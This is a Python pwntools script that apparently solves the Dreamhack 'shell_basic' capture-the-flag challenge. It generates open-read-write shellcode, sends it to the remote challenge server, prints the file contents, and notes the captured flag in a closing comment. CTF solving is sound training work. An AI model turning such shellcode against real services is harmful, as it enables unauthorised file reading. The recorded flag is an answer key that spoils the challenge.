from pwn import *

# Set the context for x86-64 architecture
context.arch = 'amd64'

# The path to the flag file
flag_path = "/home/shell_basic/flag_name_is_loooooong"

# Use pwntools to automatically generate the ORW shellcode
# This is much easier than writing it by hand in assembly
shellcode = shellcraft.open(flag_path)  # Open the file
shellcode += shellcraft.read('rax', 'rsp', 0x100) # Read from the file descriptor (in rax) into the stack (rsp)
shellcode += shellcraft.write(1, 'rsp', 'rax') # Write the bytes read (in rax) from the stack to stdout (fd=1)

# Assemble the shellcode into machine code
assembled_code = asm(shellcode)

# --- Connect and send ---
# p = process("./shell_basic")
p = remote("host8.dreamhack.games", 20501) # Replace with correct host and port

p.sendafter(b"shellcode: ", assembled_code)

# Print the flag
flag = p.recvall()
print(flag.decode())

# Flag: DH{ca562d7cf1db6c55cb11c4ec350a3c0b}